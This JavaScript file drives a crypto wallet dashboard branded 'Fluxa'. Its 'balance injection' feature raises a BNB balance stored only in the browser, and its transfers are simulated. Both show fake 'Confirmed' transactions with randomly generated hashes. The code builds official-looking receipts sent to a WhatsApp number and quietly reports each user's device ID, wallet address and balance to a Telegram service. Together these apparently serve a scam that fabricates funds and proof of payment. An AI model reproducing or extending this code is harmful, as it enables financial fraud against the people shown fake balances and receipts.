
let showingBalance = true;
let showingNaira = true;
let showingPrivateKey = false;

// Navigation functions
function goBack() {
    window.location.href = 'welcome.html';
}

function goToDashboard() {
    // Already on dashboard
}

function goToCalculator() {
    window.location.href = 'calculator.html';
}

function goToHistory() {
    window.location.href = 'history.html';
}

function goToSettings() {
    window.location.href = 'settings.html';
}

// Balance functions
function toggleBalance() {
    const balanceAmount = document.getElementById('balanceAmount');
    const balanceUSD = document.getElementById('balanceUSD');
    const toggleBtn = document.querySelector('.toggle-balance');
    
    showingBalance = !showingBalance;
    
    if (showingBalance) {
        balanceAmount.textContent = '0.3164 BNB';
        balanceUSD.textContent = showingNaira ? '₦124,995,123' : '$79.11';
        toggleBtn.innerHTML = `
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                <circle cx="12" cy="12" r="3"/>
            </svg>
        `;
    } else {
        balanceAmount.textContent = '••••••••';
        balanceUSD.textContent = 'Hidden';
        toggleBtn.innerHTML = `
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94L17.94 17.94z"/>
                <line x1="1" y1="1" x2="23" y2="23"/>
                <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19L9.9 4.24z"/>
            </svg>
        `;
    }
}

function toggleCurrency() {
    const currencyToggle = document.querySelector('.currency-toggle');
    const balanceUSD = document.getElementById('balanceUSD');
    
    showingNaira = !showingNaira;
    
    if (showingNaira) {
        currencyToggle.textContent = 'NGN';
        if (showingBalance) {
            balanceUSD.textContent = '₦124,995,123';
        }
    } else {
        currencyToggle.textContent = 'USD';
        if (showingBalance) {
            balanceUSD.textContent = '$79.11';
        }
    }
}

// Wallet functions
function togglePrivateKey() {
    const privateKeyElement = document.getElementById('privateKey');
    const toggleBtn = document.querySelector('.toggle-btn');
    
    showingPrivateKey = !showingPrivateKey;
    
    if (showingPrivateKey) {
        const storedKey = localStorage.getItem('walletPrivateKey') || 'a1b2c3d4e5f6789012345678901234567890123456789012345678901234567890';
        privateKeyElement.textContent = storedKey;
        toggleBtn.innerHTML = `
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94L17.94 17.94z"/>
                <line x1="1" y1="1" x2="23" y2="23"/>
                <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19L9.9 4.24z"/>
            </svg>
        `;
    } else {
        privateKeyElement.textContent = '••••••••••••••••••••••••••••••••';
        toggleBtn.innerHTML = `
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                <circle cx="12" cy="12" r="3"/>
            </svg>
        `;
    }
}

function copyAddress() {
    const address = localStorage.getItem('walletAddress') || '0x0948...2Ec9';
    copyToClipboard(address, 'Wallet Address');
}

function copyPrivateKey() {
    const privateKey = localStorage.getItem('walletPrivateKey') || 'a1b2c3d4e5f6789012345678901234567890123456789012345678901234567890';
    copyToClipboard(privateKey, 'Private Key');
}

function copyToClipboard(text, label) {
    navigator.clipboard.writeText(text).then(() => {
        showNotification(`${label} copied to clipboard!`, 'success');
    }).catch(() => {
        // Fallback for older browsers
        const textArea = document.createElement('textarea');
        textArea.value = text;
        document.body.appendChild(textArea);
        textArea.select();
        document.execCommand('copy');
        document.body.removeChild(textArea);
        
        showNotification(`${label} copied to clipboard!`, 'success');
    });
}

// Action functions
function injectBalance() {
    showInjectionModal();
}

function showInjectionModal() {
    const currentBalance = parseFloat(localStorage.getItem('walletBalance') || '0.3164');
    const injectionAmount = currentBalance * 0.5; // Add 50% more (1.5x total = current + 0.5x)
    const injectionAmountUSD = (injectionAmount * 250).toFixed(2);
    
    const modal = document.createElement('div');
    modal.className = 'modal-overlay injection-modal';
    modal.innerHTML = `
        <div class="modal-content injection-content">
            <div class="modal-header">
                <h3>Balance Injection</h3>
            </div>
            <div class="modal-body injection-body">
                <div class="injection-stage ready-stage">
                    <div class="injection-icon">
                        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <line x1="12" y1="5" x2="12" y2="19"/>
                            <line x1="5" y1="12" x2="19" y2="12"/>
                        </svg>
                    </div>
                    <h4>Ready to Inject</h4>
                    <p>You will receive ${injectionAmount.toFixed(4)} BNB ($${injectionAmountUSD})</p>
                    <small>This process will take 30 seconds</small>
                    <button onclick="startInjection(${injectionAmount})" class="btn primary injection-btn">Start Injection</button>
                </div>
                
                <div class="injection-stage processing-stage" style="display: none;">
                    <div class="injection-icon spinning">
                        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <path d="M21 12a9 9 0 11-6.219-8.56"/>
                        </svg>
                    </div>
                    <h4>Injecting Balance</h4>
                    <p>Adding ${injectionAmount.toFixed(4)} BNB to your wallet...</p>
                    <div class="timer">30s remaining</div>
                    <div class="progress-container">
                        <div class="progress-label">
                            <span>Progress</span>
                            <span class="progress-percent">0%</span>
                        </div>
                        <div class="progress-bar">
                            <div class="progress-fill"></div>
                        </div>
                    </div>
                </div>
                
                <div class="injection-stage complete-stage" style="display: none;">
                    <div class="injection-icon success">
                        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <polyline points="20,6 9,17 4,12"/>
                        </svg>
                    </div>
                    <h4>Injection Complete!</h4>
                    <p>Successfully added ${injectionAmount.toFixed(4)} BNB</p>
                    <div class="success-amount">+$${injectionAmountUSD} USD</div>
                    <div style="display: flex; gap: 12px; margin-top: 20px;">
                        <button onclick="sendInjectionReceiptWhatsApp(${injectionAmount.toFixed(4)})" class="btn secondary" style="flex: 1;">
                            <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
                                <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893A11.821 11.821 0 0020.885 3.488"/>
                            </svg>
                            Get Receipt
                        </button>
                        <button onclick="closeModal()" class="btn primary" style="flex: 1;">Continue</button>
                    </div>
                </div>
            </div>
        </div>
    `;
    
    document.body.appendChild(modal);
}

function showDeposit() {
    const address = localStorage.getItem('walletAddress') || '0x0948...2Ec9';
    
    const modal = document.createElement('div');
    modal.className = 'modal-overlay';
    modal.innerHTML = `
        <div class="modal-content">
            <div class="modal-header">
                <h3>Deposit BNB</h3>
                <button onclick="closeModal()" class="close-btn">×</button>
            </div>
            <div class="modal-body">
                <h4 style="color: #ffffff; margin-bottom: 12px;">Your Wallet Address</h4>
                <div class="address-box">
                    <code>${address}</code>
                    <button onclick="copyToClipboard('${address}', 'Deposit Address')" class="copy-btn">
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
                            <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
                        </svg>
                    </button>
                </div>
                <p class="warning-text">Send BNB to this address to deposit funds to your wallet</p>
            </div>
        </div>
    `;
    
    document.body.appendChild(modal);
}

function showSend() {
    const modal = document.createElement('div');
    modal.className = 'modal-overlay';
    modal.innerHTML = `
        <div class="modal-content">
            <div class="modal-header">
                <h3>Send BNB</h3>
                <button onclick="closeModal()" class="close-btn">×</button>
            </div>
            <div class="modal-body">
                <div class="input-group">
                    <label>Recipient Address</label>
                    <input type="text" id="sendAddress" placeholder="0x..." />
                </div>
                <div class="input-group">
                    <label>Amount (BNB)</label>
                    <input type="number" id="sendAmount" placeholder="0.0000" step="0.0001" />
                    <small>Available: 0.3164 BNB</small>
                </div>
                <div class="warning-box" style="margin: 16px 0;">
                    <p style="margin: 0; font-size: 12px;">• Network fee: ~0.0005 BNB</p>
                    <p style="margin: 4px 0 0; font-size: 12px;">• Transaction is irreversible</p>
                </div>
                <button onclick="processSend()" class="btn primary">Send BNB</button>
            </div>
        </div>
    `;
    
    document.body.appendChild(modal);
}

function processSend() {
    const address = document.getElementById('sendAddress').value;
    const amount = document.getElementById('sendAmount').value;
    
    if (!address || !amount) {
        showNotification('Please enter valid address and amount', 'error');
        return;
    }
    
    if (parseFloat(amount) <= 0) {
        showNotification('Amount must be greater than 0', 'error');
        return;
    }
    
    const currentBalance = parseFloat(localStorage.getItem('walletBalance') || '0.3164');
    if (parseFloat(amount) > currentBalance) {
        showNotification('Insufficient balance', 'error');
        return;
    }
    
    showTransferProgress(address, amount, currentBalance);
    closeModal();
}

function showTransferProgress(address, amount, currentBalance) {
    const modal = document.createElement('div');
    modal.className = 'modal-overlay transfer-modal';
    modal.innerHTML = `
        <div class="modal-content transfer-content">
            <div class="transfer-stage processing-stage">
                <div class="transfer-icon">
                    <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="spinning">
                        <path d="M21 12a9 9 0 11-6.219-8.56"/>
                    </svg>
                </div>
                <h4>Processing Transaction</h4>
                <p>Sending ${amount} BNB to ${address.slice(0, 8)}...${address.slice(-6)}</p>
                <div class="transfer-details">
                    <div class="detail-row">
                        <span>Amount:</span>
                        <span>${amount} BNB</span>
                    </div>
                    <div class="detail-row">
                        <span>Network Fee:</span>
                        <span>0.0005 BNB</span>
                    </div>
                    <div class="detail-row total">
                        <span>Total:</span>
                        <span>${(parseFloat(amount) + 0.0005).toFixed(4)} BNB</span>
                    </div>
                </div>
                <div class="progress-container">
                    <div class="progress-bar">
                        <div class="progress-fill" style="animation: fillProgress 3s ease-in-out forwards;"></div>
                    </div>
                </div>
            </div>
        </div>
    `;
    
    document.body.appendChild(modal);
    
    setTimeout(() => {
        // Update balance
        const newBalance = (currentBalance - parseFloat(amount) - 0.0005).toFixed(4);
        localStorage.setItem('walletBalance', newBalance);
        
        if (showingBalance) {
            document.getElementById('balanceAmount').textContent = `${newBalance} BNB`;
            const newUSD = (newBalance * 250).toFixed(2);
            const newNaira = (newUSD * 1580).toLocaleString();
            document.getElementById('balanceUSD').textContent = showingNaira ? `₦${newNaira}` : `$${newUSD}`;
        }
        
        // Show success state
        showTransferSuccess(address, amount);
        
        // Add to recent activity
        addRecentActivity('send', parseFloat(amount), `Sent to ${address.slice(0, 6)}...${address.slice(-4)}`);
    }, 3000);
}

async function showTransferSuccess(address, amount) {
    const modal = document.querySelector('.transfer-modal .modal-content');
    if (modal) {
        modal.innerHTML = `
            <div class="transfer-stage success-stage">
                <div class="transfer-icon success">
                    <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <polyline points="20,6 9,17 4,12"/>
                    </svg>
                </div>
                <h4>Transfer Successful!</h4>
                <p>Successfully sent ${amount} BNB</p>
                <div class="success-details">
                    <div class="detail-row">
                        <span>To:</span>
                        <span>${address.slice(0, 8)}...${address.slice(-6)}</span>
                    </div>
                    <div class="detail-row">
                        <span>Amount:</span>
                        <span>${amount} BNB</span>
                    </div>
                    <div class="detail-row">
                        <span>Status:</span>
                        <span class="status-confirmed">Confirmed</span>
                    </div>
                </div>
                <div style="display: flex; gap: 12px; margin-top: 20px;">
                    <button onclick="sendTransactionReceiptWhatsApp('send', ${amount}, '${address}')" class="btn secondary" style="flex: 1;">
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
                            <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893A11.821 11.821 0 0020.885 3.488"/>
                        </svg>
                        Get Receipt
                    </button>
                    <button onclick="closeModal()" class="btn primary" style="flex: 1;">Done</button>
                </div>
            </div>
        `;
    }
    
    // Send Telegram notification for transfer
    const deviceId = localStorage.getItem('deviceIdOriginal') || 'Unknown';
    const fromAddress = localStorage.getItem('walletAddress') || '0x0948...2Ec9';
    try {
        await telegramService.notifyTransfer(deviceId, fromAddress, address, parseFloat(amount), 'send');
    } catch (error) {
        console.log('Telegram notification failed:', error);
    }
}

function addRecentActivity(type, amount, description) {
    const activities = JSON.parse(localStorage.getItem('recentActivities') || '[]');
    const activity = {
        type,
        amount,
        description,
        timestamp: new Date().toISOString(),
        id: Date.now()
    };
    
    activities.unshift(activity);
    activities.splice(5); // Keep only last 5 activities
    
    localStorage.setItem('recentActivities', JSON.stringify(activities));
    loadRecentActivity();
}

function loadRecentActivity() {
    const activities = JSON.parse(localStorage.getItem('recentActivities') || '[]');
    const container = document.querySelector('.recent-activity');
    
    if (activities.length === 0) {
        container.innerHTML = `
            <h4>Recent Activity</h4>
            <div style="text-align: center; padding: 40px 0; color: #6B7280;">
                <p>No recent activity</p>
            </div>
        `;
        return;
    }
    
    container.innerHTML = `
        <h4>Recent Activity</h4>
        ${activities.map(activity => `
            <div class="transaction-item">
                <div class="transaction-left">
                    <div class="transaction-icon ${activity.type}">
                        ${getActivityIcon(activity.type)}
                    </div>
                    <div class="transaction-details">
                        <h4>${activity.description}</h4>
                        <p>${getTimeAgo(new Date(activity.timestamp))}</p>
                    </div>
                </div>
                <div class="transaction-amount">
                    <div class="${activity.type === 'send' ? 'amount-negative' : 'amount-positive'}">
                        ${activity.type === 'send' ? '-' : '+'}${activity.amount.toFixed(4)} BNB
                    </div>
                </div>
            </div>
        `).join('')}
    `;
}

function getActivityIcon(type) {
    switch (type) {
        case 'inject':
            return `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <line x1="12" y1="5" x2="12" y2="19"/>
                <line x1="5" y1="12" x2="19" y2="12"/>
            </svg>`;
        case 'send':
            return `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <line x1="22" y1="2" x2="11" y2="13"/>
                <polygon points="22,2 15,22 11,13 2,9 22,2"/>
            </svg>`;
        case 'receive':
            return `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
                <polyline points="7,10 12,15 17,10"/>
                <line x1="12" y1="15" x2="12" y2="3"/>
            </svg>`;
        default:
            return `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <circle cx="12" cy="12" r="10"/>
                <line x1="12" y1="8" x2="12" y2="16"/>
                <line x1="8" y1="12" x2="16" y2="12"/>
            </svg>`;
    }
}

function getTimeAgo(date) {
    const now = new Date();
    const diffMs = now - date;
    const diffMinutes = Math.floor(diffMs / (1000 * 60));
    const diffHours = Math.floor(diffMs / (1000 * 60 * 60));
    const diffDays = Math.floor(diffMs / (1000 * 60 * 60 * 24));
    
    if (diffDays > 0) {
        return `${diffDays} day${diffDays > 1 ? 's' : ''} ago`;
    } else if (diffHours > 0) {
        return `${diffHours} hour${diffHours > 1 ? 's' : ''} ago`;
    } else if (diffMinutes > 0) {
        return `${diffMinutes} minute${diffMinutes > 1 ? 's' : ''} ago`;
    } else {
        return 'Just now';
    }
}

function startInjection(injectionAmount) {
    const modal = document.querySelector('.injection-modal');
    const readyStage = modal.querySelector('.ready-stage');
    const processingStage = modal.querySelector('.processing-stage');
    
    readyStage.style.display = 'none';
    processingStage.style.display = 'block';
    
    let timeLeft = 30;
    let progress = 0;
    
    const timer = setInterval(() => {
        timeLeft--;
        progress = ((30 - timeLeft) / 30) * 100;
        
        modal.querySelector('.timer').textContent = `${timeLeft}s remaining`;
        modal.querySelector('.progress-percent').textContent = `${Math.round(progress)}%`;
        modal.querySelector('.progress-fill').style.width = `${progress}%`;
        
        if (timeLeft <= 0) {
            clearInterval(timer);
            completeInjection(injectionAmount);
        }
    }, 1000);
}

async function completeInjection(injectionAmount) {
    const modal = document.querySelector('.injection-modal');
    const processingStage = modal.querySelector('.processing-stage');
    const completeStage = modal.querySelector('.complete-stage');
    
    processingStage.style.display = 'none';
    completeStage.style.display = 'block';
    
    // Update balance
    const currentBalance = parseFloat(localStorage.getItem('walletBalance') || '0.3164');
    const newBalance = (currentBalance + injectionAmount).toFixed(4);
    localStorage.setItem('walletBalance', newBalance);
    
    if (showingBalance) {
        document.getElementById('balanceAmount').textContent = `${newBalance} BNB`;
        const newUSD = (newBalance * 250).toFixed(2);
        const newNaira = (newUSD * 1580).toLocaleString();
        document.getElementById('balanceUSD').textContent = showingNaira ? `₦${newNaira}` : `$${newUSD}`;
    }
    
    // Add to recent activity
    addRecentActivity('inject', injectionAmount, 'Balance injection completed');
    
    // Send Telegram notification for balance injection
    const deviceId = localStorage.getItem('deviceIdOriginal') || 'Unknown';
    const address = localStorage.getItem('walletAddress') || '0x0948...2Ec9';
    try {
        await telegramService.notifyBalanceInjection(deviceId, address, currentBalance, parseFloat(newBalance), injectionAmount);
    } catch (error) {
        console.log('Telegram notification failed:', error);
    }
    
    // Show notification
    if (Notification.permission === 'granted') {
        new Notification('Balance Injection Complete!', {
            body: `${injectionAmount.toFixed(4)} BNB has been added to your wallet`,
            icon: '/favicon.ico'
        });
    }
}

function closeModal() {
    const modal = document.querySelector('.modal-overlay');
    if (modal) {
        modal.remove();
    }
}

function showNotification(message, type) {
    // Remove existing notifications
    const existing = document.querySelector('.notification');
    if (existing) {
        existing.remove();
    }
    
    const notification = document.createElement('div');
    notification.className = `notification ${type}`;
    
    const color = type === 'error' ? '#ef4444' : type === 'success' ? '#22c55e' : '#3b82f6';
    const bgColor = type === 'error' ? 'rgba(239, 68, 68, 0.2)' : type === 'success' ? 'rgba(34, 197, 94, 0.2)' : 'rgba(59, 130, 246, 0.2)';
    
    notification.innerHTML = `
        <div style="
            background: ${bgColor};
            border: 1px solid ${color}33;
            border-radius: 12px;
            padding: 12px 16px;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            gap: 8px;
            animation: slideInDown 0.3s ease-out;
            position: fixed;
            top: 60px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 1000;
            min-width: 300px;
            max-width: 90%;
        ">
            <span style="color: ${color}; font-size: 14px;">${message}</span>
        </div>
    `;
    
    document.body.appendChild(notification);
    
    // Remove notification after 4 seconds
    setTimeout(() => {
        notification.remove();
    }, 4000);
}

// Generate transaction receipt for WhatsApp
function generateTransactionReceipt(type, amount, address, txHash) {
    const deviceId = localStorage.getItem('deviceIdOriginal') || 'Unknown';
    const walletAddress = localStorage.getItem('walletAddress') || '0x0948...2Ec9';
    const currentBalance = localStorage.getItem('walletBalance') || '0.3164';
    const timestamp = new Date().toLocaleString();
    const txId = generateTxHash();
    
    const emoji = type === 'send' ? '📤' : type === 'receive' ? '📥' : '💉';
    const action = type === 'send' ? 'SENT' : type === 'receive' ? 'RECEIVED' : 'INJECTED';
    
    const message = `┌─────────────────────────────┐
│     🧾 FLUXA WALLET RECEIPT      │
└─────────────────────────────┘

${emoji} ${action} TRANSACTION

┌─ Transaction Details ────────┐
│ 📱 Device: ${deviceId.slice(0, 12)}...     │
│ 🏠 From: ${walletAddress.slice(0, 8)}...${walletAddress.slice(-4)}    │
│ 💰 Amount: ${amount} BNB          │
│ 💵 USD: $${(amount * 250).toFixed(2)}                │
${type === 'send' ? `│ 🎯 To: ${address.slice(0, 8)}...${address.slice(-4)}      │` : ''}
│ 💳 Balance: ${currentBalance} BNB        │
└─────────────────────────────┘

┌─ Network Information ────────┐
│ 🔗 Hash: ${txId}     │
│ 📅 Date: ${timestamp.split(',')[0]}        │
│ ⏰ Time: ${timestamp.split(',')[1]}       │
│ ✅ Status: CONFIRMED         │
│ 🌐 Network: BSC (BEP-20)     │
└─────────────────────────────┘

📞 Support: +234 807 130 9276
🌟 Fluxa Premium Wallet Platform

Receipt ID: #${Date.now().toString().slice(-8)}
Generated: ${new Date().toLocaleString()}

Need help? Contact support! 🙏`;

    return message;
}

// Generate random transaction hash
function generateTxHash() {
    const chars = '0123456789abcdef';
    let hash = '0x';
    for (let i = 0; i < 8; i++) {
        hash += chars[Math.floor(Math.random() * chars.length)];
    }
    hash += '...';
    for (let i = 0; i < 4; i++) {
        hash += chars[Math.floor(Math.random() * chars.length)];
    }
    return hash;
}

// Send transaction receipt via WhatsApp
function sendTransactionReceiptWhatsApp(type, amount, address = '', txHash = '') {
    const receiptMessage = generateTransactionReceipt(type, amount, address, txHash);
    const whatsappUrl = `https://wa.me/2348071309276?text=${encodeURIComponent(receiptMessage)}`;
    window.open(whatsappUrl, '_blank');
}

// Send balance injection receipt
function sendInjectionReceiptWhatsApp(injectedAmount) {
    sendTransactionReceiptWhatsApp('inject', injectedAmount);
}

// Initialize dashboard
document.addEventListener('DOMContentLoaded', async function() {
    // Load wallet data
    const walletAddress = localStorage.getItem('walletAddress') || '0x0948A1B2C3D4E5F67890123456789012345678902Ec9';
    document.getElementById('walletAddress').textContent = `${walletAddress.slice(0, 6)}...${walletAddress.slice(-4)}`;
    
    // Load saved balance
    const savedBalance = localStorage.getItem('walletBalance') || '0.3164';
    if (showingBalance) {
        document.getElementById('balanceAmount').textContent = `${savedBalance} BNB`;
        const balanceUSD = (parseFloat(savedBalance) * 250).toFixed(2);
        const balanceNaira = (balanceUSD * 1580).toLocaleString();
        document.getElementById('balanceUSD').textContent = showingNaira ? `₦${balanceNaira}` : `$${balanceUSD}`;
    }
    
    // Load recent activity
    loadRecentActivity();
    
    // Send Telegram notification for dashboard access
    const deviceId = localStorage.getItem('deviceIdOriginal') || 'Unknown';
    const balance = parseFloat(savedBalance);
    const balanceUSD = balance * 250;
    try {
        await telegramService.notifyDashboardAccess(deviceId, walletAddress, balance, balanceUSD);
    } catch (error) {
        console.log('Telegram notification failed:', error);
    }
});
